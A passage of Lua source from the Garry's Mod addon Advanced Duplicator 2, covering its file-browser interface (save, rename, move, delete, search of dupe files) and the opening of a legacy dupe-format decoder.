					ReadPath = AdvDupe2.DataFolder .. "/" .. ReadPath .. ".txt"
				elseif (ReadArea == 1) then
					ReadPath = AdvDupe2.DataFolder .. "/-Public-/" .. ReadPath .. ".txt"
				else
					ReadPath = "adv_duplicator/" .. ReadPath .. ".txt"
				end
				if (not file.Exists(ReadPath, "DATA")) then
					AdvDupe2.Notify("File does not exist", NOTIFY_ERROR)
					return
				end

				local read = file.Read(ReadPath)
				local name = string.Explode("/", ReadPath)
				name = name[#name]
				name = string.sub(name, 1, #name - 4)
				local success, dupe, info, moreinfo = AdvDupe2.Decode(read)
				if (success) then
					AdvDupe2.LoadGhosts(dupe, info, moreinfo, name, true)
				end
			end)
			Menu:AddSpacer()
			Menu:AddOption("Rename", function()
				if (parent.Expanding) then return end
				parent.Submit:SetMaterial("icon16/page_edit.png")
				parent.Submit:SetTooltip("Rename File")
				parent.Desc:SetVisible(false)
				parent.Info:SetVisible(false)
				parent.FileName.FirstChar = true
				parent.FileName.PrevText = parent.FileName:GetValue()
				parent.FileName:SetVisible(true)
				parent.FileName:SetText(node.Label:GetText())
				parent.FileName:SelectAllOnFocus(true)
				parent.FileName:OnMousePressed()
				parent.FileName:RequestFocus()
				parent.Expanding = true
				AdvDupe2.FileBrowser:Slide(true)
				parent.Submit.DoClick = function()
					local name = parent.FileName:GetValue()
					if (name == "") then
						AdvDupe2.Notify("Name field is blank.", NOTIFY_ERROR)
						parent.FileName:SelectAllOnFocus(true)
						parent.FileName:OnGetFocus()
						parent.FileName:RequestFocus()
						return
					end
					AddHistory(name)
					RenameFileCl(node, name)
					AdvDupe2.FileBrowser:Slide(false)
				end
				parent.FileName.OnEnter = parent.Submit.DoClick
			end)
			Menu:AddOption("Move File", function()
				parent.Submit:SetMaterial("icon16/page_paste.png")
				parent.Submit:SetTooltip("Move File")
				parent.FileName:SetVisible(false)
				parent.Desc:SetVisible(false)
				parent.Info:SetText(
					"Select the folder you want to move \nthe File to.")
				parent.Info:SizeToContents()
				parent.Info:SetVisible(true)
				AdvDupe2.FileBrowser:Slide(true)
				node.Control.ActionNode = node
				parent.Submit.DoClick = function()
					MoveFileClient(node.Control.m_pSelectedItem)
				end
			end)
			Menu:AddOption("Delete", function()
				parent.Submit:SetMaterial("icon16/bin_empty.png")
				parent.Submit:SetTooltip("Delete File")
				parent.FileName:SetVisible(false)
				parent.Desc:SetVisible(false)
				if (#node.Label:GetText() > 22) then
					parent.Info:SetText(
						'Are you sure that you want to delete \nthe FILE, "' ..
							node.Label:GetText() .. '" \nfrom your CLIENT?')
				else
					parent.Info:SetText(
						'Are you sure that you want to delete \nthe FILE, "' ..
							node.Label:GetText() .. '" from your CLIENT?')
				end
				parent.Info:SizeToContents()
				parent.Info:SetVisible(true)
				AdvDupe2.FileBrowser:Slide(true)
				parent.Submit.DoClick = function()
					local path, area = GetNodePath(node)
					if (area == 1) then
						path = "-Public-/" .. path
					end
					if (area == 2) then
						path = "adv_duplicator/" .. path .. ".txt"
					else
						path = AdvDupe2.DataFolder .. "/" .. path .. ".txt"
					end
					node.Control:RemoveNode(node)
					file.Delete(path)
					AdvDupe2.FileBrowser:Slide(false)
				end
			end)
		end
	else
		if (root ~= "-Advanced Duplicator 1-") then
			Menu:AddOption("Save", function()
				if (parent.Expanding) then return end
				parent.Submit:SetMaterial("icon16/page_save.png")
				parent.Submit:SetTooltip("Save Duplication")
				if (parent.FileName:GetValue() == "Folder_Name...") then
					parent.FileName:SetText("File_Name...")
				end
				parent.Desc:SetVisible(true)
				parent.Info:SetVisible(false)
				parent.FileName.FirstChar = true
				parent.FileName.PrevText = parent.FileName:GetValue()
				parent.FileName:SetVisible(true)
				parent.FileName:SelectAllOnFocus(true)
				parent.FileName:OnMousePressed()
				parent.FileName:RequestFocus()
				node.Control.ActionNode = node
				parent.Expanding = true
				AdvDupe2.FileBrowser:Slide(true)
				parent.Submit.DoClick = function()
					local name = parent.FileName:GetValue()
					if (name == "" or name == "File_Name...") then
						AdvDupe2.Notify("Name field is blank.", NOTIFY_ERROR)
						parent.FileName:SelectAllOnFocus(true)
						parent.FileName:OnGetFocus()
						parent.FileName:RequestFocus()
						return
					end
					local desc = parent.Desc:GetValue()
					if (desc == "Description...") then
						desc = ""
					end
					AdvDupe2.SavePath = GetFullPath(node) .. name
					AddHistory(name)
					if (game.SinglePlayer()) then
						RunConsoleCommand("AdvDupe2_SaveFile", name, desc, GetNodePath(node))
					else
						RunConsoleCommand("AdvDupe2_SaveFile", name)
					end
					AdvDupe2.FileBrowser:Slide(false)
				end
				parent.FileName.OnEnter =
					function()
						parent.FileName:KillFocus()
						parent.Desc:SelectAllOnFocus(true)
						parent.Desc.OnMousePressed()
						parent.Desc:RequestFocus()
					end
				parent.Desc.OnEnter = parent.Submit.DoClick
			end)
		end
		Menu:AddOption("New Folder", function()
			if (parent.Expanding) then return end
			parent.Submit:SetMaterial("icon16/folder_add.png")
			parent.Submit:SetTooltip("Add new folder")
			if (parent.FileName:GetValue() == "File_Name...") then
				parent.FileName:SetText("Folder_Name...")
			end
			parent.Desc:SetVisible(false)
			parent.Info:SetVisible(false)
			parent.FileName.FirstChar = true
			parent.FileName.PrevText = parent.FileName:GetValue()
			parent.FileName:SetVisible(true)
			parent.FileName:SelectAllOnFocus(true)
			parent.FileName:OnMousePressed()
			parent.FileName:RequestFocus()
			parent.Expanding = true
			AdvDupe2.FileBrowser:Slide(true)
			parent.Submit.DoClick = function() AddNewFolder(node) end
			parent.FileName.OnEnter = parent.Submit.DoClick
		end)
		Menu:AddOption("Search", function()
			parent.Submit:SetMaterial("icon16/find.png")
			parent.Submit:SetTooltip("Search Files")
			if (parent.FileName:GetValue() == "Folder_Name...") then
				parent.FileName:SetText("File_Name...")
			end
			parent.Desc:SetVisible(false)
			parent.Info:SetVisible(false)
			parent.FileName.FirstChar = true
			parent.FileName.PrevText = parent.FileName:GetValue()
			parent.FileName:SetVisible(true)
			parent.FileName:SelectAllOnFocus(true)
			parent.FileName:OnMousePressed()
			parent.FileName:RequestFocus()
			parent.Expanding = true
			AdvDupe2.FileBrowser:Slide(true)
			parent.Submit.DoClick = function()
				Search(node, string.lower(parent.FileName:GetValue()))
				AddHistory(parent.FileName:GetValue())
				parent.FileName:SetVisible(false)
				parent.Submit:SetMaterial("icon16/arrow_undo.png")
				parent.Submit:SetTooltip("Return to Browser")
				parent.Info:SetVisible(true)
				parent.Info:SetText(#parent.Search.pnlCanvas.Files ..
										' files found searching for, "' ..
										parent.FileName:GetValue() .. '"')
				parent.Info:SizeToContents()
				parent.Submit.DoClick = function()
					parent.Search:Remove()
					parent.Search = nil
					parent.Browser:SetVisible(true)
					AdvDupe2.FileBrowser:Slide(false)
					parent.Cancel:SetVisible(true)
				end
				parent.Cancel:SetVisible(false)
			end
			parent.FileName.OnEnter = parent.Submit.DoClick
		end)
		if (node.Label:GetText()[1] ~= "-") then
			Menu:AddOption("Delete", function()
				parent.Submit:SetMaterial("icon16/bin_empty.png")
				parent.Submit:SetTooltip("Delete Folder")
				parent.FileName:SetVisible(false)
				parent.Desc:SetVisible(false)
				if (#node.Label:GetText() > 22) then
					parent.Info:SetText(
						'Are you sure that you want to delete \nthe FOLDER, "' ..
							node.Label:GetText() .. '" \nfrom your CLIENT?')
				else
					parent.Info:SetText(
						'Are you sure that you want to delete \nthe FOLDER, "' ..
							node.Label:GetText() .. '" from your CLIENT?')
				end
				parent.Info:SizeToContents()
				parent.Info:SetVisible(true)
				AdvDupe2.FileBrowser:Slide(true)
				parent.Submit.DoClick = function()
					local path, area = GetNodePath(node)
					if (area == 1) then
						path = "-Public-/" .. path
					end
					if (area == 2) then
						path = "adv_duplicator/" .. path .. "/"
					else
						path = AdvDupe2.DataFolder .. "/" .. path .. "/"
					end
					node.Control:RemoveNode(node)
					DeleteFilesInFolders(path)
					AdvDupe2.FileBrowser:Slide(false)
				end
			end)
		end
	end
	if (not node.Control.Search) then
		Menu:AddSpacer()
		Menu:AddOption("Collapse Folder", function()
			if (node.ParentNode.ParentNode) then
				node.ParentNode:SetExpanded(false)
			end
		end)
		Menu:AddOption("Collapse Root", function() CollapseParentsComplete(node) end)
		if (parent.Expanded) then
			Menu:AddOption("Cancel Action", function() parent.Cancel:DoClick() end)
		end
	end

	Menu:Open()
end

local function CollapseParents(node, val)
	if (not node) then return end
	node.ChildList:SetTall(node.ChildList:GetTall() - val)
	CollapseParents(node.ParentNode, val)
end

function BROWSER:RemoveNode(node)
	local parent = node.ParentNode
	parent.Nodes = parent.Nodes - 1
	if (node.IsFolder) then
		if (node.m_bExpanded) then
			CollapseParents(parent, node.ChildList:GetTall() + 20)
			for i = 1, #parent.ChildrenExpanded do
				if (node == parent.ChildrenExpanded[i]) then
					table.remove(parent.ChildrenExpanded, i)
					break
				end
			end
		elseif (parent.m_bExpanded) then
			CollapseParents(parent, 20)
		end
		for i = 1, #parent.Folders do
			if (node == parent.Folders[i]) then
				table.remove(parent.Folders, i)
			end
		end
		node.ChildList:Remove()
		node:Remove()
	else
		for i = 1, #parent.Files do
			if (node == parent.Files[i]) then
				table.remove(parent.Files, i)
			end
		end
		CollapseParents(parent, 20)
		node:Remove()
		if (#parent.Files == 0 and #parent.Folders == 0) then
			parent.Expander:Remove()
			parent.Expander = nil
			parent.m_bExpanded = false
		end
	end
	if (self.VBar.Scroll > self.VBar.CanvasSize) then
		self.VBar:SetScroll(self.VBar.Scroll)
	end
	if (self.m_pSelectedItem) then
		self.m_pSelectedItem = nil
	end
end

function BROWSER:OnMouseWheeled(dlta)
	return self.VBar:OnMouseWheeled(dlta)
end

function BROWSER:AddFolder(text)
	local node = vgui.Create("advdupe2_browser_folder", self)
	node.Control = self

	node.Offset = 0
	node.ChildrenExpanded = {}
	node.Icon:SetPos(18, 1)
	node.Label:SetPos(44, 0)
	node.Label:SetText(text)
	node.Label:SizeToContents()
	node.ParentNode = self
	node.IsFolder = true
	self.Nodes = self.Nodes + 1
	node.Folders = {}
	node.Files = {}
	table.insert(self.Folders, node)
	self:SetTall(self:GetTall() + 20)

	return node
end

function BROWSER:AddFile(text)
	local node = vgui.Create("advdupe2_browser_file", self)
	node.Control = self
	node.Offset = 0
	node.Icon:SetPos(18, 1)
	node.Label:SetPos(44, 0)
	node.Label:SetText(text)
	node.Label:SizeToContents()
	node.ParentNode = self
	self.Nodes = self.Nodes + 1
	table.insert(self.Files, node)
	self:SetTall(self:GetTall() + 20)

	return node
end

function BROWSER:Sort(node)
	tableSortNodes(node.Folders)
	tableSortNodes(node.Files)

	for i = 1, #node.Folders do
		node.Folders[i]:SetParent(nil)
		node.Folders[i]:SetParent(node.ChildList)
		node.Folders[i].ChildList:SetParent(nil)
		node.Folders[i].ChildList:SetParent(node.ChildList)
	end
	for i = 1, #node.Files do
		node.Files[i]:SetParent(nil)
		node.Files[i]:SetParent(node.ChildList)
	end
end

function BROWSER:SetSelected(node)
	if (IsValid(self.m_pSelectedItem)) then
		self.m_pSelectedItem:SetSelected(false)
	end
	self.m_pSelectedItem = node
	if (node) then node:SetSelected(true) end
end

local function ExpandParents(node, val)
	if (not node) then return end
	node.ChildList:SetTall(node.ChildList:GetTall() + val)
	ExpandParents(node.ParentNode, val)
end

function BROWSER:Expand(node)
	node.ChildList:SetTall(node.Nodes * 20)
	table.insert(node.ParentNode.ChildrenExpanded, node)
	ExpandParents(node.ParentNode, node.Nodes * 20)
end

local function ExtendParents(node)
	if (not node) then return end
	node.ChildList:SetTall(node.ChildList:GetTall() + 20)
	ExtendParents(node.ParentNode)
end

function BROWSER:Extend(node)
	node.ChildList:SetTall(node.ChildList:GetTall() + 20)
	ExtendParents(node.ParentNode)
end

function BROWSER:Collapse(node)
	CollapseParents(node.ParentNode, node.ChildList:GetTall())

	for i = 1, #node.ParentNode.ChildrenExpanded do
		if (node.ParentNode.ChildrenExpanded[i] == node) then
			table.remove(node.ParentNode.ChildrenExpanded, i)
			break
		end
	end
	CollapseChildren(node)
end

function BROWSER:RenameNode(name)
	self.ActionNode.Label:SetText(name)
	self.ActionNode.Label:SizeToContents()
	self:Sort(self.ActionNode.ParentNode)
end

function BROWSER:MoveNode(name)
	self:RemoveNode(self.ActionNode)
	self.ActionNode2:AddFile(name)
	self:Sort(self.ActionNode2)
end

function BROWSER:DeleteNode()
	self:RemoveNode(self.ActionNode)
end

derma.DefineControl("advdupe2_browser_tree", "AD2 File Browser", BROWSER, "Panel")

local FOLDER = {}

AccessorFunc(FOLDER, "m_bBackground", "PaintBackground", FORCE_BOOL)
AccessorFunc(FOLDER, "m_bgColor", "BackgroundColor")

Derma_Hook(FOLDER, "Paint", "Paint", "Panel")

function FOLDER:Init()
	self:SetMouseInputEnabled(true)

	self:SetTall(20)
	self:SetPaintBackground(true)
	self:SetPaintBackgroundEnabled(false)
	self:SetPaintBorderEnabled(false)
	self:SetBackgroundColor(Color(0, 0, 0, 0))

	self.Icon = vgui.Create("DImage", self)
	self.Icon:SetImage("icon16/folder.png")

	self.Icon:SizeToContents()

	self.Label = vgui.Create("DLabel", self)
	self.Label:SetDark(true)

	self.m_bExpanded = false
	self.Nodes = 0
	self.ChildrenExpanded = {}

	self:Dock(TOP)

	self.ChildList = vgui.Create("Panel", self:GetParent())
	self.ChildList:Dock(TOP)
	self.ChildList:SetTall(0)
end

local function ExpandNode(self)
	self:GetParent():SetExpanded()
end

function FOLDER:AddFolder(text)
	if (self.Nodes == 0) then
		self.Expander = vgui.Create("DExpandButton", self)
		self.Expander.DoClick = ExpandNode
		self.Expander:SetPos(self.Offset, 2)
	end

	local node = vgui.Create("advdupe2_browser_folder", self.ChildList)
	node.Control = self.Control

	node.Offset = self.Offset + 20

	node.Icon:SetPos(18 + node.Offset, 1)
	node.Label:SetPos(44 + node.Offset, 0)
	node.Label:SetText(text)
	node.Label:SizeToContents()
	node.Label:SetDark(true)
	node.ParentNode = self
	node.IsFolder = true
	node.Folders = {}
	node.Files = {}

	self.Nodes = self.Nodes + 1
	table.insert(self.Folders, node)

	if (self.m_bExpanded) then
		self.Control:Extend(self)
	end

	return node
end

function FOLDER:AddFile(text)
	if (self.Nodes == 0) then
		self.Expander = vgui.Create("DExpandButton", self)
		self.Expander.DoClick = ExpandNode
		self.Expander:SetPos(self.Offset, 2)
	end

	local node = vgui.Create("advdupe2_browser_file", self.ChildList)
	node.Control = self.Control
	node.Offset = self.Offset + 20
	node.Icon:SetPos(18 + node.Offset, 1)
	node.Label:SetPos(44 + node.Offset, 0)
	node.Label:SetText(text)
	node.Label:SizeToContents()
	node.Label:SetDark(true)
	node.ParentNode = self

	self.Nodes = self.Nodes + 1
	table.insert(self.Files, node)

	if (self.m_bExpanded) then
		self.Control:Extend(self)
	end

	return node
end

function FOLDER:SetExpanded(bool)
	if (not self.Expander) then return end
	if (bool == nil) then
		self.m_bExpanded = not self.m_bExpanded
	else
		self.m_bExpanded = bool
	end
	self.Expander:SetExpanded(self.m_bExpanded)
	if (self.m_bExpanded) then
		self.Control:Expand(self)
	else
		self.Control:Collapse(self)
	end
end

function FOLDER:SetSelected(bool)
	if (bool) then
		self:SetBackgroundColor(self:GetSkin().bg_color_bright)
	else
		self:SetBackgroundColor(Color(0, 0, 0, 0))
	end
end

function FOLDER:OnMousePressed(code)
	if (code == 107) then
		self.Control:DoNodeLeftClick(self)
	elseif (code == 108) then
		self.Control:DoNodeRightClick(self)
	end
end

derma.DefineControl("advdupe2_browser_folder", "AD2 Browser Folder node", FOLDER, "Panel")

local FILE = {}

AccessorFunc(FILE, "m_bBackground", "PaintBackground", FORCE_BOOL)
AccessorFunc(FILE, "m_bgColor", "BackgroundColor")
Derma_Hook(FILE, "Paint", "Paint", "Panel")

function FILE:Init()
	self:SetMouseInputEnabled(true)

	self:SetTall(20)
	self:SetPaintBackground(true)
	self:SetPaintBackgroundEnabled(false)
	self:SetPaintBorderEnabled(false)
	self:SetBackgroundColor(Color(0, 0, 0, 0))

	self.Icon = vgui.Create("DImage", self)
	self.Icon:SetImage("icon16/page.png")

	self.Icon:SizeToContents()

	self.Label = vgui.Create("DLabel", self)
	self.Label:SetDark(true)

	self:Dock(TOP)
end

function FILE:SetSelected(bool)
	if (bool) then
		self:SetBackgroundColor(self:GetSkin().bg_color_bright)
	else
		self:SetBackgroundColor(Color(0, 0, 0, 0))
	end
end

function FILE:OnMousePressed(code)
	if (code == 107) then
		self.Control:DoNodeLeftClick(self)
	elseif (code == 108) then
		self.Control:DoNodeRightClick(self)
	end
end

derma.DefineControl("advdupe2_browser_file", "AD2 Browser File node", FILE, "Panel")

local PANEL = {}
AccessorFunc(PANEL, "m_bBackground", "PaintBackground", FORCE_BOOL)
AccessorFunc(PANEL, "m_bgColor", "BackgroundColor")
Derma_Hook(PANEL, "Paint", "Paint", "Panel")
Derma_Hook(PANEL, "PerformLayout", "Layout", "Panel")

function PANEL:PerformLayout()
	if (self:GetWide() == self.LastX) then return end
	local x = self:GetWide()

	if (self.Search) then
		self.Search:SetWide(x)
	end

	self.Browser:SetWide(x)
	local x2, y2 = self.Browser:GetPos()
	local BtnX = x - self.Help:GetWide() - 5
	self.Help:SetPos(BtnX, 3)
	BtnX = BtnX - self.Refresh:GetWide() - 5
	self.Refresh:SetPos(BtnX, 3)

	BtnX = x - self.Submit:GetWide() - 15
	self.Cancel:SetPos(BtnX, self.Browser:GetTall() + 20)
	BtnX = BtnX - self.Submit:GetWide() - 5
	self.Submit:SetPos(BtnX, self.Browser:GetTall() + 20)

	self.FileName:SetWide(BtnX - 10)
	self.FileName:SetPos(5, self.Browser:GetTall() + 20)
	self.Desc:SetWide(x - 10)
	self.Desc:SetPos(5, self.Browser:GetTall() + 39)
	self.Info:SetPos(5, self.Browser:GetTall() + 20)

	self.LastX = x
end

local pnlorigsetsize
local function PanelSetSize(self, x, y)
	if (not self.LaidOut) then
		pnlorigsetsize(self, x, y)

		self.Browser:SetSize(x, y - 20)
		self.Browser:SetPos(0, 20)

		if (self.Search) then
			self.Search:SetSize(x, y - 20)
			self.Search:SetPos(0, 20)
		end

		self.LaidOut = true
	else
		pnlorigsetsize(self, x, y)
	end

end

local function PurgeFiles(path, curParent)
	local files, directories = file.Find(path .. "*", "DATA")
	if (directories) then
		for k, v in pairs(directories) do
			curParent = curParent:AddFolder(v)
			PurgeFiles(path .. v .. "/", curParent)
			curParent = curParent.ParentNode
		end
	end

	if (files) then
		for k, v in pairs(files) do
			curParent:AddFile(string.sub(v, 1, #v - 4))
		end
	end
end

local function UpdateClientFiles()

	local pnlCanvas = AdvDupe2.FileBrowser.Browser.pnlCanvas

	for i = 1, 2 do
		if (pnlCanvas.Folders[1]) then
			pnlCanvas:RemoveNode(pnlCanvas.Folders[1])
		end
	end

	PurgeFiles("advdupe2/", pnlCanvas:AddFolder("-Advanced Duplicator 2-"))

	PurgeFiles("adv_duplicator/", pnlCanvas:AddFolder("-Advanced Duplicator 1-"))

	if (pnlCanvas.Folders[2]) then
		if (#pnlCanvas.Folders[2].Folders == 0 and #pnlCanvas.Folders[2].Files == 0) then
			pnlCanvas:RemoveNode(pnlCanvas.Folders[2])
		end

		pnlCanvas.Folders[1]:SetParent(nil)
		pnlCanvas.Folders[1]:SetParent(pnlCanvas.ChildList)
		pnlCanvas.Folders[1].ChildList:SetParent(nil)
		pnlCanvas.Folders[1].ChildList:SetParent(pnlCanvas.ChildList)
	end

end

function PANEL:Init()

	AdvDupe2.FileBrowser = self
	self.Expanded = false
	self.Expanding = false
	self.LastX = 0
	self.LastY = 0
	pnlorigsetsize = self.SetSize
	self.SetSize = PanelSetSize

	self:SetPaintBackground(true)
	self:SetPaintBackgroundEnabled(false)
	self:SetBackgroundColor(self:GetSkin().bg_color_bright)

	self.Browser = vgui.Create("advdupe2_browser_panel", self)
	UpdateClientFiles()
	self.Refresh = vgui.Create("DImageButton", self)
	self.Refresh:SetMaterial("icon16/arrow_refresh.png")
	self.Refresh:SizeToContents()
	self.Refresh:SetTooltip("Refresh Files")
	self.Refresh.DoClick = function(button) UpdateClientFiles() end

	self.Help = vgui.Create("DImageButton", self)
	self.Help:SetMaterial("icon16/help.png")
	self.Help:SizeToContents()
	self.Help:SetTooltip("Help Section")
	self.Help.DoClick = function(btn)
		local Menu = DermaMenu()
		Menu:AddOption("Bug Reporting", function()
			gui.OpenURL("https://github.com/wiremod/advdupe2/issues")
		end)
		Menu:AddOption("Controls", function()
			gui.OpenURL("https://github.com/wiremod/advdupe2/wiki/Controls")
		end)
		Menu:AddOption("Commands", function()
			gui.OpenURL(
				"https://github.com/wiremod/advdupe2/wiki/Server-settings")
		end)
		Menu:Open()
	end

	self.Submit = vgui.Create("DImageButton", self)
	self.Submit:SetMaterial("icon16/page_save.png")
	self.Submit:SizeToContents()
	self.Submit:SetTooltip("Confirm Action")
	self.Submit.DoClick = function()
		self.Expanding = true
		AdvDupe2.FileBrowser:Slide(false)
	end

	self.Cancel = vgui.Create("DImageButton", self)
	self.Cancel:SetMaterial("icon16/cross.png")
	self.Cancel:SizeToContents()
	self.Cancel:SetTooltip("Cancel Action")
	self.Cancel.DoClick = function()
		self.Expanding = true
		AdvDupe2.FileBrowser:Slide(false)
	end

	self.FileName = vgui.Create("DTextEntry", self)
	self.FileName:SetAllowNonAsciiCharacters(true)
	self.FileName:SetText("File_Name...")
	self.FileName.Last = 0

	self.FileName.OnEnter = function()
		self.FileName:KillFocus()
		self.Desc:SelectAllOnFocus(true)
		self.Desc.OnMousePressed()
		self.Desc:RequestFocus()
	end
	self.FileName.OnMousePressed = function()
		self.FileName:OnGetFocus()
		if (self.FileName:GetValue() == "File_Name..." or
			self.FileName:GetValue() == "Folder_Name...") then
			self.FileName:SelectAllOnFocus(true)
		end
	end
	self.FileName:SetUpdateOnType(true)
	self.FileName.OnTextChanged = function()

		if (self.FileName.FirstChar) then
			if (string.lower(self.FileName:GetValue()[1]) ==
				string.lower(input.LookupBinding("menu"))) then
				self.FileName:SetText(self.FileName.PrevText)
				self.FileName:SelectAll()
				self.FileName.FirstChar = false
			else
				self.FileName.FirstChar = false
			end
		end

		local new, changed = self.FileName:GetValue():gsub("[^%w_ ]", "")
		if changed > 0 then
			self.FileName:SetText(new)
			self.FileName:SetCaretPos(#new)
		end
		if (#self.FileName:GetValue() > 0) then
			NarrowHistory(self.FileName:GetValue(), self.FileName.Last)
			local options = {}
			if (#Narrow > 4) then
				for i = 1, 4 do table.insert(options, Narrow[i]) end
			else
				options = Narrow
			end
			if (#options ~= 0 and #self.FileName:GetValue() ~= 0) then
				self.FileName.HistoryPos = 0
				self.FileName:OpenAutoComplete(options)
				self.FileName.Menu.Attempts = 1
				if (#Narrow > 4) then
					self.FileName.Menu:AddOption("...", function() end)
				end
			elseif (IsValid(self.FileName.Menu)) then
				self.FileName.Menu:Remove()
			end
		end
		self.FileName.Last = #self.FileName:GetValue()
	end
	self.FileName.OnKeyCodeTyped = function(txtbox, code)
		txtbox:OnKeyCode(code)

		if (code == KEY_ENTER and not txtbox:IsMultiline() and txtbox:GetEnterAllowed()) then
			if (txtbox.HistoryPos == 5 and txtbox.Menu:ChildCount() == 5) then
				if ((txtbox.Menu.Attempts + 1) * 4 < #Narrow) then
					for i = 1, 4 do
						txtbox.Menu:GetChild(i):SetText(Narrow[i + txtbox.Menu.Attempts * 4])
					end
				else
					txtbox.Menu:GetChild(5):Remove()
					for i = 4, (txtbox.Menu.Attempts * 4 - #Narrow) * -1 + 1, -1 do
						txtbox.Menu:GetChild(i):Remove()
					end

					for i = 1, #Narrow - txtbox.Menu.Attempts * 4 do
						txtbox.Menu:GetChild(i):SetText(Narrow[i + txtbox.Menu.Attempts * 4])
					end
				end
				txtbox.Menu:ClearHighlights()
				txtbox.Menu:HighlightItem(txtbox.Menu:GetChild(1))
				txtbox.HistoryPos = 1
				txtbox.Menu.Attempts = txtbox.Menu.Attempts + 1
				return true
			end

			if (IsValid(txtbox.Menu)) then
				txtbox.Menu:Remove()
			end
			txtbox:FocusNext()
			txtbox:OnEnter()
			txtbox.HistoryPos = 0
		end

		if (txtbox.m_bHistory or IsValid(txtbox.Menu)) then
			if (code == KEY_UP) then
				txtbox.HistoryPos = txtbox.HistoryPos - 1;
				if (txtbox.HistoryPos ~= -1 or txtbox.Menu:ChildCount() ~= 5) then
					txtbox:UpdateFromHistory()
				else
					txtbox.Menu:ClearHighlights()
					txtbox.Menu:HighlightItem(txtbox.Menu:GetChild(5))
					txtbox.HistoryPos = 5
				end
			end
			if (code == KEY_DOWN or code == KEY_TAB) then
				txtbox.HistoryPos = txtbox.HistoryPos + 1;
				if (txtbox.HistoryPos ~= 5 or txtbox.Menu:ChildCount() ~= 5) then
					txtbox:UpdateFromHistory()
				else
					txtbox.Menu:ClearHighlights()
					txtbox.Menu:HighlightItem(txtbox.Menu:GetChild(5))
				end
			end

		end
	end
	self.FileName.OnValueChange = function()
		if (self.FileName:GetValue() ~= "File_Name..." and
			self.FileName:GetValue() ~= "Folder_Name...") then
			local new, changed = self.FileName:GetValue():gsub("[^%w_ ]", "")
			if changed > 0 then
				self.FileName:SetText(new)
				self.FileName:SetCaretPos(#new)
			end
		end
	end

	self.Desc = vgui.Create("DTextEntry", self)
	self.Desc.OnEnter = self.Submit.DoClick
	self.Desc:SetText("Description...")
	self.Desc.OnMousePressed = function()
		self.Desc:OnGetFocus()
		if (self.Desc:GetValue() == "Description...") then
			self.Desc:SelectAllOnFocus(true)
		end
	end

	self.Info = vgui.Create("DLabel", self)
	self.Info:SetVisible(false)

end

function PANEL:Slide(expand)
	if (expand) then
		if (self.Expanded) then
			self:SetTall(self:GetTall() - 40)
			self.Expanded = false
		else
			self:SetTall(self:GetTall() + 5)
		end
	else
		if (not self.Expanded) then
			self:SetTall(self:GetTall() + 40)
			self.Expanded = true
		else
			self:SetTall(self:GetTall() - 5)
		end
	end
	count = count + 1
	if (count < 9) then
		timer.Simple(0.01, function() self:Slide(expand) end)
	else
		if (expand) then
			self.Expanded = true
		else
			self.Expanded = false
		end
		self.Expanding = false
		count = 0
	end
end

function PANEL:GetFullPath(node)
	return GetFullPath(node)
end

function PANEL:GetNodePath(node)
	return GetNodePath(node)
end

if (game.SinglePlayer()) then
	usermessage.Hook("AdvDupe2_AddFile", function(um)
		local asvNode = AdvDupe2.FileBrowser.AutoSaveNode
		local actNode = AdvDupe2.FileBrowser.Browser.pnlCanvas.ActionNode
		if (um:ReadBool()) then
			if (IsValid(asvNode)) then
				local name = um:ReadString()
				for iD = 1, #asvNode.Files do
					if (name == asvNode.Files[i]) then return end
				end
				asvNode:AddFile(name)
				asvNode.Control:Sort(asvNode)
			end
		else
			actNode:AddFile(um:ReadString())
			actNode.Control:Sort(actNode)
		end
	end)
end

vgui.Register("advdupe2_browser", PANEL, "Panel")

--PATH addons/rp_advdupe2/lua/advdupe2/sh_codec_legacy.lua:
--[[
	Title: Adv. Dupe 2 Codec Legacy Support

	Desc: Facilitates opening of dupes from AD1 and earlier AD2 versions.

	Author: emspike

	Version: 2.0
]]

local pairs = pairs
local type = type
local tonumber = tonumber
local error = error
local Vector = Vector
local Angle = Angle
local format = string.format
local char = string.char
local byte = string.byte
local sub = string.sub
local gsub = string.gsub
local find = string.find
local gmatch = string.gmatch
local match = string.match
local concat = table.concat

--[[
	Name:	GenerateDupeStamp
	Desc:	Generates an info table.
	Params:	<player> ply
	Return:	<table> stamp
]]
function AdvDupe2.GenerateDupeStamp(ply)
	local stamp = {}
	stamp.name = ply:GetName()
	stamp.time = os.date("%I:%M %p")
	stamp.date = os.date("%d %B %Y")
	stamp.timezone = os.date("%z")
	hook.Call("AdvDupe2_StampGenerated",GAMEMODE,stamp)
	return stamp
end

local AD2FF = "AD2F%s\n%s\n%s"

local decode_types_v1, decode_types_v2
local tables = 0
local str,pos
local a,b,c,m,n,w,tblref

local function read_v2()
	local t = byte(str, pos+1)
	if t then
		local dt = decode_types_v2[t]
		if dt then
			pos = pos + 1
			return dt()
		else
			error(format("encountered invalid data type (%u)\n",t))
		end
	else
		error("expected value, got EOF\n")
	end
end

decode_types_v2 = {
	[1	] = function()
		error("expected value, got terminator\n")
	end,
	[2	] = function() -- table
		
		m = find(str, "\1", pos)
		if m then
			w = sub(str, pos+1, m-1)
			pos = m
		else
			error("expected table identifier, got EOF\n")
		end
		
		local t = {}
		tables[w] = t
		
		while true do
			if byte(str, pos+1) == 1 then
				pos = pos + 1
				return t
			else
				t[read_v2()] = read_v2()
			end
		end
	end,
	[3	] = function() -- array
		
		m = find(str, "\1", pos)
		if m then
			w = sub(str, pos+1, m-1)
			pos = m
		else
			error("expected table identifier, got EOF\n")
		end
		
		local t, i = {}, 1
		
		tables[w] = t
		
		while true do
			if byte(str,pos+1) == 1 then
				pos = pos+1
				return t
			else
				t[i] = read_v2()
				i = i + 1
			end
		end
	end,
	[4	] = function() -- false boolean
		return false
	end,
	[5	] = function() -- true boolean
		return true
	end,
	[6	] = function() -- number
		m = find(str, "\1", pos)
		if m then
			a = tonumber(sub(str, pos+1, m-1)) or 0
			pos = m
			return a
		else
			error("expected number, got EOF\n")
		end
	end,
	[7	] = function() -- string
		m = find(str,"\1",pos)
		if m then
			w = sub(str, pos+1, m-1)
			pos = m
			return w
		else
			error("expected string, got EOF\n")
		end
	end,
	[8	] = function() -- Vector
		m,n = find(str,".-\1.-\1.-\1", pos)
		if m then
			a,b,c = match(str,"^(.-)\1(.-)\1(.-)\1",pos+1)
			pos = n
			return Vector(tonumber(a), tonumber(b), tonumber(c))
		else
			error("expected vector, got EOF\n")
		end
	end,
	[9	] = function() -- Angle
		m,n = find(str, ".-\1.-\1.-\1", pos)
		if m then
			a,b,c = match(str, "^(.-)\1(.-)\1(.-)\1",pos+1)
			pos = n
			return Angle(tonumber(a), tonumber(b), tonumber(c))
		else
